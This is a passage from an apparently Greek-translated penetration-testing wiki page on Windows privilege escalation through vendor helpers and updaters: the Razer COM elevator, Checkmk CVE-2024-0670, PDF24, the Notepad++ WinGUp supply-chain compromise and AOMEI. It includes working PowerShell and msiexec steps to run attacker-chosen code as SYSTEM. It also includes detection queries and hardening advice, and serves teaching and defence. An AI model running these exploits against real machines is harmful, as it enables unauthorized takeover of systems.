- Καλέστε το `LaunchProcessNoWait(<path>, "", 1)` για να ζητήσετε elevated launch.
- Στο public PoC, το PE-signature gate μέσα στο `simple_service.dll` γίνεται patch out πριν από την αποστολή του αιτήματος, επιτρέποντας την εκκίνηση ενός αυθαίρετου εκτελέσιμου που επιλέγει ο attacker.<sup>[[6]](#references)[[10]](#references)</sup>

Ελάχιστη κλήση PowerShell:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Γενικό συμπέρασμα: κατά την ανάλυση «helper» suites, μην περιορίζεστε στο localhost TCP ή στα named pipes. Ελέγξτε για COM classes με ονόματα όπως `Elevator`, `Launcher`, `Updater` ή `Utility` και, στη συνέχεια, επαληθεύστε αν η privileged service ελέγχει η ίδια το binary-στόχο ή απλώς εμπιστεύεται ένα αποτέλεσμα που υπολογίζεται από μια patchable user-mode client DLL. Αυτό το μοτίβο δεν αφορά μόνο τη Razer: κάθε σχεδιασμός με διαχωρισμένους ρόλους, όπου ο broker με υψηλά προνόμια δέχεται απόφαση allow/deny από την πλευρά με χαμηλά προνόμια, είναι πιθανή επιφάνεια privesc.


---
## Προβλέψιμη εκτέλεση προσωρινού script κατά την επιδιόρθωση MSI (Checkmk Agent / CVE-2024-0670)

Ορισμένοι Windows agents εξακολουθούν να υλοποιούν privileged ενέργειες γράφοντας ένα προσωρινό `.cmd` στο `C:\Windows\Temp` και εκτελώντας το ως `SYSTEM`. Αν το όνομα του αρχείου είναι προβλέψιμο και η service δεν δημιουργεί με ασφάλεια νέα αρχεία όταν υπάρχουν ήδη, ένας χρήστης με χαμηλά προνόμια μπορεί να δημιουργήσει εκ των προτέρων το μελλοντικό προσωρινό αρχείο ως **μόνο για ανάγνωση** και να κάνει την privileged process να εκτελέσει περιεχόμενο που ελέγχει ο επιτιθέμενος, αντί για το δικό της script.

Παρατηρήθηκε σε ευάλωτες εκδόσεις του Checkmk Agent:
- μοτίβο προσωρινού αρχείου: `cmk_all_<PID>_1.cmd`
- επηρεαζόμενοι κλάδοι: `2.0.0`, `2.1.0`, `2.2.0`
- έναυσμα: **επιδιόρθωση** MSI του αποθηκευμένου πακέτου agent<sup>[[8]](#references)[[9]](#references)</sup>

Πρακτική διαδικασία:
1. Εκτιμήστε ένα ρεαλιστικό εύρος PID με βάση τα τρέχοντα process IDs ή το PID του agent που εκτελείται.
2. Γράψτε ένα σύντομο payload `.cmd` σε **ASCII** (`Set-Content -Encoding Ascii` ή ανακατεύθυνση εξόδου μέσω `cmd.exe`· αποφύγετε την έξοδο PowerShell σε UTF-16 για batch files).
3. Δημιουργήστε μαζικά αρχεία `C:\Windows\Temp\cmk_all_<PID>_1.cmd` σε όλο το πιθανό εύρος και ορίστε τα ως μόνο για ανάγνωση.
4. Ενεργοποιήστε επιδιόρθωση του αποθηκευμένου MSI, ώστε η privileged service να επιχειρήσει να αναδημιουργήσει και έπειτα να εκτελέσει το προσωρινό script.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Αν το ευάλωτο προϊόν έχει εγκατασταθεί με το Windows Installer, αντιστοιχίστε το MSI με την τυχαία ονομασία που είναι αποθηκευμένο στην cache του `C:\Windows\Installer` με το όνομα του προϊόντος, πριν ενεργοποιήσετε την επιδιόρθωση:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Λειτουργικές σημειώσεις:
- Το `qwinsta` είναι χρήσιμο όταν το `msiexec /fa` αποτυγχάνει από μη διαδραστικό κέλυφος WinRM και χρειάζεται να διαπιστώσετε αν μια υπάρχουσα συνεδρία επιφάνειας εργασίας ή αποσυνδεδεμένη συνεδρία μπορεί να ενεργοποιήσει σωστά την επιδιόρθωση.<sup>[[7]](#references)</sup>
- Αυτό το μοτίβο γενικεύεται σε άλλους endpoint agents και updaters που **τοποθετούν προσωρινά scripts σε τοποθεσίες με δικαίωμα εγγραφής από όλους και αργότερα τα εκτελούν ως SYSTEM**. Ελέγξτε για προβλέψιμα ονόματα, απουσία σημασιολογίας αποκλειστικής δημιουργίας και ροές επιδιόρθωσης/ενημέρωσης που μπορούν να ενεργοποιηθούν κατ' απαίτηση.

### Διαδραστική επιδιόρθωση installer και προνομιούχα κονσόλα

Το PDF24 Creator 11.15.1 αποτελεί παράδειγμα ξεχωριστού κινδύνου επιδιόρθωσης MSI: η custom action εγκατάστασης εκτυπωτή μπορεί να ανοίξει ορατή κονσόλα με δικαιώματα SYSTEM κατά την επιδιόρθωση. Ο προμηθευτής τροποποίησε το MSI installer στην έκδοση 11.15.2 για να αντιμετωπίσει αυτή τη συμπεριφορά. Μια παλαιότερη έκδοση προϊόντος αποτελεί μόνο ένδειξη για περαιτέρω διερεύνηση. Ελέγξτε το καταχωρισμένο ή προσβάσιμο πακέτο MSI, αν ο συγκεκριμένος χρήστης μπορεί να ξεκινήσει επιδιόρθωση, αν υπάρχουν η ευάλωτη custom action και η καθυστέρηση στο αρχείο καταγραφής, καθώς και αν μια διαδραστική επιφάνεια εργασίας μπορεί να εμφανίσει την κονσόλα. Η αναφερόμενη καθυστέρηση χρησιμοποιούσε oplock στο `faxPrnInst.log`· η απλή δυνατότητα εγγραφής στο αρχείο δεν είναι η μόνη προϋπόθεση πρόσβασης. Ένα μη διαδραστικό κέλυφος, ένα μη προσβάσιμο πακέτο ή ένας διορθωμένος installer μπορεί να διακόψει την αλυσίδα. Αυτό το ζήτημα δεν εξαρτάται από το `AlwaysInstallElevated` και διαφέρει από την αντικατάσταση ενός προβλέψιμου προσωρινού script.

---
## Απομακρυσμένη κατάληψη της εφοδιαστικής αλυσίδας μέσω ανεπαρκούς επικύρωσης updater (WinGUp / Notepad++)

Μεταξύ Ιουνίου 2025 και Δεκεμβρίου 2025, επιτιθέμενοι που παραβίασαν την υποδομή φιλοξενίας πίσω από τη ροή ενημέρωσης του Notepad++ παρείχαν επιλεκτικά κακόβουλα manifests σε επιλεγμένα θύματα. Παλαιότεροι updaters που βασίζονταν στο WinGUp δεν επαλήθευαν πλήρως την αυθεντικότητα των ενημερώσεων, οπότε μια κακόβουλη απόκριση XML μπορούσε να ανακατευθύνει τους clients σε URL που ελέγχονταν από τους επιτιθέμενους. Επειδή ο client αποδεχόταν περιεχόμενο HTTPS χωρίς να απαιτεί τόσο αξιόπιστη αλυσίδα πιστοποιητικών όσο και έγκυρη υπογραφή PE στο ληφθέν installer, τα θύματα κατέβαζαν και εκτελούσαν ένα trojanized NSIS `update.exe`.<sup>[[12]](#references)[[13]](#references)</sup>

Λειτουργική ροή (δεν απαιτείται τοπικό exploit):
1. **Παρεμβολή στην υποδομή**: παραβίαση CDN/φιλοξενίας και απόκριση στους ελέγχους ενημέρωσης με metadata των επιτιθέμενων που δείχνουν σε κακόβουλο URL λήψης.
2. **Trojanized NSIS**: ο installer κατεβάζει/εκτελεί ένα payload και αξιοποιεί δύο αλυσίδες εκτέλεσης:
   - **Χρήση δικού σας υπογεγραμμένου binary + sideload**: συμπερίληψη του υπογεγραμμένου `BluetoothService.exe` της Bitdefender και τοποθέτηση ενός κακόβουλου `log.dll` στη διαδρομή αναζήτησής του. Όταν εκτελείται το υπογεγραμμένο binary, τα Windows φορτώνουν μέσω sideload το `log.dll`, το οποίο αποκρυπτογραφεί και φορτώνει ανακλαστικά το backdoor Chrysalis (προστατευμένο με Warbird και με API hashing για να δυσχεραίνεται η στατική ανίχνευση).
   - **Έγχυση shellcode μέσω script**: το NSIS εκτελεί ένα μεταγλωττισμένο Lua script που χρησιμοποιεί Win32 APIs (π.χ. `EnumWindowStationsW`) για να εγχύσει shellcode και να προετοιμάσει το Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Μέτρα ενίσχυσης/σημεία ανίχνευσης για κάθε auto-updater:
- Επιβάλετε **επαλήθευση πιστοποιητικού και υπογραφής** του ληφθέντος installer (καρφιτσώστε την υπογραφή του προμηθευτή, απορρίψτε ασύμβατο CN/αλυσίδα) και υπογράψτε και το update manifest (π.χ. με XMLDSig). Αποκλείστε ανακατευθύνσεις που ελέγχονται από το manifest, εκτός αν έχουν επικυρωθεί.
- Αντιμετωπίστε το **sideloading υπογεγραμμένου binary που παρέχεται από τον επιτιθέμενο** ως σημείο διερεύνησης μετά τη λήψη: ειδοποιηθείτε όταν ένα υπογεγραμμένο EXE προμηθευτή φορτώνει DLL με όνομα από τοποθεσία εκτός της κανονικής διαδρομής εγκατάστασής του (π.χ. όταν η Bitdefender φορτώνει το `log.dll` από Temp/Downloads) και όταν ένας updater τοποθετεί ή εκτελεί installers από προσωρινή τοποθεσία με υπογραφές που δεν ανήκουν στον προμηθευτή.
- Παρακολουθείτε **artefacts ειδικά για το malware** που παρατηρήθηκαν σε αυτή την αλυσίδα (χρήσιμα ως γενικά σημεία διερεύνησης): mutex `Global\Jdhfv_1.0.1`, ασυνήθιστες εγγραφές του `gup.exe` στο `%TEMP%` και στάδια έγχυσης shellcode μέσω Lua.
- Το Notepad++ ενίσχυσε το WinGUp στην έκδοση v8.8.9 και τις μεταγενέστερες: το XML που επιστρέφεται είναι πλέον υπογεγραμμένο (XMLDSig), ενώ οι νεότερες εκδόσεις επιβάλλουν επαλήθευση πιστοποιητικού και υπογραφής του ληφθέντος installer αντί να εμπιστεύονται μόνο τη μεταφορά.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – φόρτωση DLL μέσω sideload από υπογεγραμμένο EXE της Bitdefender <code>log.dll</code> (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> εκκινεί ένα πρόγραμμα εγκατάστασης που δεν είναι του Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Αυτά τα μοτίβα ισχύουν για κάθε updater που δέχεται unsigned manifests ή δεν επαληθεύει τους υπογράφοντες των installers — network hijack + malicious installer + BYO-signed sideloading οδηγούν σε remote code execution υπό το πρόσχημα «έμπιστων» updates.

### Η διαμόρφωση ειδοποιήσεων ως δεύτερος μηχανισμός ενεργοποίησης update

Ένας updater μπορεί να χρησιμοποιεί ξεχωριστές remote configurations για να **προετοιμάσει περιεχόμενο και να ενεργοποιήσει την εκτέλεσή του**. Αυτό απαιτεί έλεγχο των configurations ή των αποκρίσεών τους· οι αναφορές δεν προσδιορίζουν πώς αποκτήθηκε πρόσβαση στην πηγή. Στην περίπτωση της AOMEI, το `down_html.ini` όριζε ένα archive URL, μια έκδοση (`thrid`) και ένα MD5 (`Val`)· ο attacker αύξησε την έκδοση και άλλαξε ταυτόχρονα το URL και το αντίστοιχο checksum. Πρόκειται για την [αστοχία στο όριο εμπιστοσύνης των metadata](#2-hijacking-the-update-channel-to-run-code-as-system) που αναφέρθηκε παραπάνω. Η πρόσθετη διαδρομή εκτέλεσης ήταν το `Notifycfg.ini`: όριζε στο `ABNotify.exe` να φορτώσει ένα εξαγμένο `upgrade-now.html` μέσω ενός τοπικού URL `file:///` σε WebView. Η σελίδα μεταβαλλόταν αυτόματα σε ένα γειτονικό εκτελέσιμο αρχείο, το οποίο το WebView παρέδιδε στο system shell. Η θυγατρική διεργασία κληρονομούσε τα δικαιώματα του notifier· αυτό δεν την ανήγαγε αυτομάτως σε SYSTEM.<sup>[[17]](#references)[[18]](#references)</sup>

Η Google ανέφερε επίσης ένα τροποποιημένο `Notifycfg.ini` με περισσότερα από 35.000 επαναλαμβανόμενα εικονικά sections, τα οποία παρέκαμψαν τον συνήθη έλεγχο έκδοσης αυτού του client. Η αναφορά δεν τεκμηριώνει γενική παράκαμψη του parser. Ο attacker επανέφερε τα remote files μετά από χρονικά παράθυρα πέντε έως δέκα λεπτών, επομένως μόνο οι clients που έκαναν polling κατά τη διάρκειά τους λάμβαναν την τροποποιημένη configuration. Αυτό το κανάλι ειδοποιήσεων μετέφερε επίσης ένα ξεχωριστό [δέλεαρ εξαναγκασμού WebDAV/NTLM](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion), το οποίο δεν απαιτούσε την εκτέλεση του archive.<sup>[[18]](#references)</sup>

---
## References
- [1] [Συμβουλευτική ανακοίνωση – Netskope Client for Windows – Τοπική κλιμάκωση δικαιωμάτων μέσω κακόβουλου server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Συμβουλευτική ανακοίνωση ασφαλείας Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – plugin Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Παραβίαση των ASUS DriverHub, MSI Center, Acer Control Centre και Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Τοπική κλιμάκωση δικαιωμάτων μέσω εγγράψιμων αρχείων στο Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Κλιμάκωση δικαιωμάτων στον Windows agent](https://checkmk.com/werk/16361)
- [10] [PoCs του sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Κρατικοί φορείς εκμεταλλεύονται την αλυσίδα εφοδιασμού του Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – Ενημέρωση για το περιστατικό παραβίασης υποδομής](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Παράκαμψη της διόρθωσης για το CVE-2025-0309 στο Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Εντοπισμός σφαλμάτων κλιμάκωσης δικαιωμάτων στο Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: Από gRPC σε SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [ManageEngine Threat Analysis Lab – Παραβίαση της αλυσίδας εφοδιασμού του AOMEI Backupper](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group και Mandiant – Διερεύνηση παροδικής παραποίησης της αλυσίδας εφοδιασμού](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
